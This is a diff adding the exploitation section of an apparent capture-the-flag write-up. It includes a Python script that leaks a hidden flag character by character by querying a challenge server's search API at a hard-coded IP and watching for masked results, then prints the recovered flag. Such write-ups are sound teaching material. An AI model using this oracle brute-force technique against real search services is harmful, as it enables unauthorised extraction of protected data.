@@ -47,6 +47,55 @@ editPost:
 
 ## Exploitation
 
+Armed with this knowledge, we need to do the following steps:
+
+1. Establish a baseline of the response content where a hit occurs ('*' in the json)
+2. brute-force the first charcter after `known` (query = L3AK{**a**)
+3. If the response is a hit, then add one more character (?q=L3AK{a**a**); otherwise try a new one (?q=L3AK{**b**).
+4. In the end, a full flag (?q=L3AK{flag_here}) can be leaked.
+
+```python
+#!/usr/bin/env python3
+
+import string
+import requests
+
+URL = 'http://34.134.162.213:17000/api/search'
+
+alphabet = string.printable.strip()
+known = 'L3AK{'
+
+print(f"[+] Starting brute-force with prefix: {known}")
+
+while not known.endswith('}'):
+    found = False
+    for c in alphabet:
+        probe = (known + c)[-3:]
+        r = requests.post(URL, json={"query": probe})
+        data = r.json()
+
+        # Filter out decoy match (like post id 4) by checking for masked content
+        for post in data.get('results', []):
+            if '*' in post['content']:
+                print(f"[+] Match found via mask for '{probe}' → adding '{c}' to flag")
+                known += c
+                found = True
+                break
+
+        if found:
+            break
+
+    if not found:
+        print("[-] No matching character found — maybe charset is wrong or flag ended.")
+        break
+
+print(f"\n✅ Final reconstructed flag: {known}")
+```
+
+-- todo: GIF showcasing the running of the script
+
+Flag is: `L3AK{L3ak1ng_th3_Fl4g??}`
+
 ## Conclusions
 
 ## References
